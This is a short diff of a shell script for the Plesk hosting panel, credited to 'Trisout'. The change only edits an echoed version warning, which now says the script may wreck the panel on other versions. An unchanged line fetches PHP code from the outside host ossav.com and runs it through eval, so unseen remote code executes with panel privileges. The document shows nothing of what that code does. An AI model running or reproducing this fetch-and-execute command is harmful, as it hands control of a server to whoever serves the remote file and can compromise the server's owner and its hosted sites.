@@ -1,7 +1,7 @@
 echo "******************"
 echo "Script by Trisout"
 echo "******************"
-echo "Warning: This Script is made for 18.0.54 of plesk panel. It is possible that it does not work on other versions."
+echo "Warning: This Script is made for 18.0.54 Update 4 of plesk panel. It is possible that it does not work AND NUKE YOUR PLESK on other versions."
 sleep 20
 plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
 sleep 5
